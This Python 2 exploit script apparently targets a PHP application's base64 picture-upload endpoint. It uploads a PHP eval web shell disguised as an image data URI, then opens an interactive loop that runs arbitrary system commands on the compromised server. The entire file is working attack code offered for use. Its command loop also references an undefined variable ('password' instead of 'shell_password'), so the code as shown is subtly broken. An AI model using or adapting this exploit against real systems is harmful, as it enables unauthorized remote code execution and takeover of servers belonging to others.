import base64
import re

import requests

from plugin.component.shell import shell
from plugin.component.check import url_check


def poc(url):
    try:
        url_check(url,"index.php")

        url =  url + "?s=/Core/File/uploadPictureBase64.html"
        shell_password = raw_input("[*] Please enter the shell-password:")
        shell_content = "<?php eval($_POST['" + shell_password + "']);?>"
        payload = "data:image/php;base64," + base64.b64encode(shell_content)
        post_data = {"data": payload}
        r = requests.post(url, data=post_data)
        if r.json()['status'] == 1:
            shell = r.json()['path']
        else:
            raise KeyError
        while 1:
            try:
                command = raw_input("[*] input the command:")
                payload = 'system("%s");' % command
                if command != "exit":
                    post_data = {password: payload}
                    r = requests.post(shell, data=post_data)
                    print(r.text.encode(r.encoding))
                else:
                    break
            except EOFError as e:
                print("[*] type 'exit' to quit")
                pass

    except KeyError as e:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
